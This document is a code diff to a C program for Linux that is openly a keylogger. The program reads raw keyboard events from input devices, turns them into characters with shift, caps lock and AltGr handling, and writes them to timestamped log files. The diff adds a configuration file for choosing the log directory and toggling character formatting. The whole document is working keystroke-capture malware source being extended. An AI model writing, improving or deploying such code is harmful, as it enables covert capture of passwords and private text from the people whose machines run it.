@@ -18,6 +18,10 @@
 #define KEY_MAX 0x2ff
 #endif
 
+// Configuration variables
+char config_log_directory[256] = {0};
+int config_dynamic_formatting = 1;  // Default to enabled
+
 // Helper function to test bits in ioctl results
 static inline int test_bit(int bit, unsigned long *array) {
     int idx = bit / (sizeof(unsigned long) * 8);
@@ -32,44 +36,83 @@ int int_to_string(int value, char *str) {
         str[1] = '\0';
         return 1;
     }
-    
+
     char temp[16];
     int i = 0;
     int is_negative = 0;
-    
+
     if (value < 0) {
         is_negative = 1;
         value = -value;
     }
-    
+
     while (value > 0) {
         temp[i++] = '0' + (value % 10);
         value /= 10;
     }
-    
+
     int len = i;
     if (is_negative) {
         str[0] = '-';
         len++;
     }
-    
+
     int j = is_negative;
     while (i > 0) {
         str[j++] = temp[--i];
     }
     str[j] = '\0';
-    
+
     return len;
+}
+
+// Function to read configuration from file
+int read_config(const char *config_file) {
+    FILE *file = fopen(config_file, "r");
+    if (!file) {
+        // Config file not found, use defaults
+        return 0;
+    }
+
+    char line[512];
+    while (fgets(line, sizeof(line), file)) {
+        // Remove newline characters
+        line[strcspn(line, "\n")] = 0;
+        
+        // Skip comments and empty lines
+        if (line[0] == '#' || line[0] == '\0') {
+            continue;
+        }
+        
+        // Parse log_directory
+        if (strncmp(line, "log_directory=", 14) == 0) {
+            const char *value = line + 14;
+            if (strlen(value) > 0 && strcmp(value, ".") != 0) {
+                strncpy(config_log_directory, value, sizeof(config_log_directory) - 1);
+                config_log_directory[sizeof(config_log_directory) - 1] = '\0';
+            } else {
+                config_log_directory[0] = '\0';  // Use default (same directory as executable)
+            }
+        }
+        // Parse dynamic_formatting
+        else if (strncmp(line, "dynamic_formatting=", 19) == 0) {
+            const char *value = line + 19;
+            config_dynamic_formatting = atoi(value);
+        }
+    }
+    
+    fclose(file);
+    return 1;
 }
 
 // Function to get the current timestamp
 void get_timestamp(char *buffer, size_t size) {
     time_t rawtime;
     struct tm *timeinfo;
-    
+
     time(&rawtime);
     timeinfo = localtime(&rawtime);
-    
+
     strftime(buffer, size, "%Y-%m-%d %H:%M:%S", timeinfo);
 }
 
@@ -170,50 +213,60 @@ const char* keycode_to_char(int keycode) {
 }
 
 int main() {
+    // Read configuration file
+    read_config("keylogger.conf");
+
     // Modifier key states
     int shift_pressed = 0;
     int caps_lock_on = 0;
     int alt_gr_pressed = 0;  // For international layouts
-    
+
     // Find input devices
     int fd;
     char device_path[256];
-    char log_filename[256];
+    char log_filename[1024];  // Increased size to prevent buffer overflow
     char timestamp[64];
     struct input_event ev;
     ssize_t n;
     const char* key_char;
-    
+
     // Get the directory of the executable
     char exe_path[512];  // Increased size to allow for longer paths
     char timestamp_str[32];
     time_t rawtime;
     struct tm *timeinfo;
-    
+
     // Get current time for log filename
     time(&rawtime);
     timeinfo = localtime(&rawtime);
     strftime(timestamp_str, sizeof(timestamp_str), "%Y%m%d_%H%M%S", timeinfo);
-    
-    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
-    if (len != -1) {
-        exe_path[len] = '\0';
-        // Extract directory path
-        char *last_slash = strrchr(exe_path, '/');
-        if (last_slash) {
-            *(last_slash+1) = '\0';
-            // Ensure we don't exceed buffer size
-            size_t exe_len = strlen(exe_path);
-            if (exe_len < sizeof(log_filename) - 32) { // 32 for "keylog_" + timestamp + ".txt" + null terminator
-                snprintf(log_filename, sizeof(log_filename), "%skeylog_%s.txt", exe_path, timestamp_str);
+
+    // Use configured log directory if specified, otherwise use executable directory
+    if (config_log_directory[0] != '\0') {
+        // Use custom log directory from config
+        snprintf(log_filename, sizeof(log_filename), "%skeylog_%s.txt", config_log_directory, timestamp_str);
+    } else {
+        // Use same directory as executable
+        ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
+        if (len != -1) {
+            exe_path[len] = '\0';
+            // Extract directory path
+            char *last_slash = strrchr(exe_path, '/');
+            if (last_slash) {
+                *(last_slash+1) = '\0';
+                // Ensure we don't exceed buffer size
+                size_t exe_len = strlen(exe_path);
+                if (exe_len < sizeof(log_filename) - 32) { // 32 for "keylog_" + timestamp + ".txt" + null terminator
+                    snprintf(log_filename, sizeof(log_filename), "%skeylog_%s.txt", exe_path, timestamp_str);
+                } else {
+                    snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str); // fallback to current directory
+                }
             } else {
-                snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str); // fallback to current directory
+                snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str);
             }
         } else {
             snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str);
         }
-    } else {
-        snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str);
     }
     
     // Arrays to hold multiple device file descriptors
@@ -355,68 +408,74 @@ int main() {
                                 // Handle character keys with modifiers
                                 char actual_char[16] = {0}; // Buffer for actual character (increased to handle longer strings like [BACKSPACE])
                                 
-                                // Map keycodes to characters considering modifier keys
-                                if (ev.code >= KEY_A && ev.code <= KEY_Z) {
-                                    // Alphabet keys - handle shift and caps lock
-                                    if ((shift_pressed || caps_lock_on) && !alt_gr_pressed) {
-                                        actual_char[0] = 'A' + (ev.code - KEY_A);
-                                    } else if (!alt_gr_pressed) {
-                                        actual_char[0] = 'a' + (ev.code - KEY_A);
-                                    } else {
-                                        // AltGr combinations - use original mapping
-                                        strcpy(actual_char, key_char);
-                                    }
-                                } else if (ev.code >= KEY_1 && ev.code <= KEY_0) {
-                                    // Number keys - handle shift for symbols
-                                    if (shift_pressed && !alt_gr_pressed) {
-                                        // US keyboard layout shift+number mappings
-                                        switch(ev.code) {
-                                            case KEY_1: strcpy(actual_char, "!"); break;
-                                            case KEY_2: strcpy(actual_char, "@"); break;
-                                            case KEY_3: strcpy(actual_char, "#"); break;
-                                            case KEY_4: strcpy(actual_char, "$"); break;
-                                            case KEY_5: strcpy(actual_char, "%"); break;
-                                            case KEY_6: strcpy(actual_char, "^"); break;
-                                            case KEY_7: strcpy(actual_char, "&"); break;
-                                            case KEY_8: strcpy(actual_char, "*"); break;
-                                            case KEY_9: strcpy(actual_char, "("); break;
-                                            case KEY_0: strcpy(actual_char, ")"); break;
-                                            default: actual_char[0] = '0' + (ev.code - KEY_1 + 1) % 10; break;
+                                // Map keycodes to characters considering modifier keys and configuration
+                                if (config_dynamic_formatting) {
+                                    // Dynamic formatting enabled - use modifier key states
+                                    if (ev.code >= KEY_A && ev.code <= KEY_Z) {
+                                        // Alphabet keys - handle shift and caps lock
+                                        if ((shift_pressed || caps_lock_on) && !alt_gr_pressed) {
+                                            actual_char[0] = 'A' + (ev.code - KEY_A);
+                                        } else if (!alt_gr_pressed) {
+                                            actual_char[0] = 'a' + (ev.code - KEY_A);
+                                        } else {
+                                            // AltGr combinations - use original mapping
+                                            strcpy(actual_char, key_char);
+                                        }
+                                    } else if (ev.code >= KEY_1 && ev.code <= KEY_0) {
+                                        // Number keys - handle shift for symbols
+                                        if (shift_pressed && !alt_gr_pressed) {
+                                            // US keyboard layout shift+number mappings
+                                            switch(ev.code) {
+                                                case KEY_1: strcpy(actual_char, "!"); break;
+                                                case KEY_2: strcpy(actual_char, "@"); break;
+                                                case KEY_3: strcpy(actual_char, "#"); break;
+                                                case KEY_4: strcpy(actual_char, "$"); break;
+                                                case KEY_5: strcpy(actual_char, "%"); break;
+                                                case KEY_6: strcpy(actual_char, "^"); break;
+                                                case KEY_7: strcpy(actual_char, "&"); break;
+                                                case KEY_8: strcpy(actual_char, "*"); break;
+                                                case KEY_9: strcpy(actual_char, "("); break;
+                                                case KEY_0: strcpy(actual_char, ")"); break;
+                                                default: actual_char[0] = '0' + (ev.code - KEY_1 + 1) % 10; break;
+                                            }
+                                        } else {
+                                            if (ev.code == KEY_0) {
+                                                actual_char[0] = '0';
+                                            } else {
+                                                actual_char[0] = '0' + (ev.code - KEY_1 + 1);
+                                            }
                                         }
                                     } else {
-                                        if (ev.code == KEY_0) {
-                                            actual_char[0] = '0';
+                                        // Handle other keys that might have shift variants
+                                        if (!alt_gr_pressed) {  // Only handle shift, not AltGr combinations
+                                            switch(ev.code) {
+                                                case KEY_MINUS: strcpy(actual_char, shift_pressed ? "_" : "-"); break;
+                                                case KEY_EQUAL: strcpy(actual_char, shift_pressed ? "+" : "="); break;
+                                                case KEY_LEFTBRACE: strcpy(actual_char, shift_pressed ? "{" : "["); break;
+                                                case KEY_RIGHTBRACE: strcpy(actual_char, shift_pressed ? "}" : "]"); break;
+                                                case KEY_BACKSLASH: strcpy(actual_char, shift_pressed ? "|" : "\\"); break;
+                                                case KEY_SEMICOLON: strcpy(actual_char, shift_pressed ? ":" : ";"); break;
+                                                case KEY_APOSTROPHE: strcpy(actual_char, shift_pressed ? "\"" : "'"); break;
+                                                case KEY_GRAVE: strcpy(actual_char, shift_pressed ? "~" : "`"); break;
+                                                case KEY_COMMA: strcpy(actual_char, shift_pressed ? "<" : ","); break;
+                                                case KEY_DOT: strcpy(actual_char, shift_pressed ? ">" : "."); break;
+                                                case KEY_SLASH: strcpy(actual_char, shift_pressed ? "?" : "/"); break;
+                                                case KEY_SPACE: strcpy(actual_char, " "); break;
+                                                case KEY_TAB: strcpy(actual_char, "\t"); break;
+                                                case KEY_BACKSPACE: strcpy(actual_char, "[BACKSPACE]"); break;
+                                                default:
+                                                    // For special keys, use the original mapping
+                                                    strcpy(actual_char, key_char);
+                                                    break;
+                                            }
                                         } else {
-                                            actual_char[0] = '0' + (ev.code - KEY_1 + 1);
+                                            // AltGr combinations - use original mapping
+                                            strcpy(actual_char, key_char);
                                         }
                                     }
                                 } else {
-                                    // Handle other keys that might have shift variants
-                                    if (!alt_gr_pressed) {  // Only handle shift, not AltGr combinations
-                                        switch(ev.code) {
-                                            case KEY_MINUS: strcpy(actual_char, shift_pressed ? "_" : "-"); break;
-                                            case KEY_EQUAL: strcpy(actual_char, shift_pressed ? "+" : "="); break;
-                                            case KEY_LEFTBRACE: strcpy(actual_char, shift_pressed ? "{" : "["); break;
-                                            case KEY_RIGHTBRACE: strcpy(actual_char, shift_pressed ? "}" : "]"); break;
-                                            case KEY_BACKSLASH: strcpy(actual_char, shift_pressed ? "|" : "\\"); break;
-                                            case KEY_SEMICOLON: strcpy(actual_char, shift_pressed ? ":" : ";"); break;
-                                            case KEY_APOSTROPHE: strcpy(actual_char, shift_pressed ? "\"" : "'"); break;
-                                            case KEY_GRAVE: strcpy(actual_char, shift_pressed ? "~" : "`"); break;
-                                            case KEY_COMMA: strcpy(actual_char, shift_pressed ? "<" : ","); break;
-                                            case KEY_DOT: strcpy(actual_char, shift_pressed ? ">" : "."); break;
-                                            case KEY_SLASH: strcpy(actual_char, shift_pressed ? "?" : "/"); break;
-                                            case KEY_SPACE: strcpy(actual_char, " "); break;
-                                            case KEY_TAB: strcpy(actual_char, "\t"); break;
-                                            case KEY_BACKSPACE: strcpy(actual_char, "[BACKSPACE]"); break;
-                                            default: 
-                                                // For special keys, use the original mapping
-                                                strcpy(actual_char, key_char);
-                                                break;
-                                        }
-                                    } else {
-                                        // AltGr combinations - use original mapping
-                                        strcpy(actual_char, key_char);
-                                    }
+                                    // Dynamic formatting disabled - use basic character mapping
+                                    strcpy(actual_char, key_char);
                                 }
                                 
                                 int char_len = strlen(actual_char);
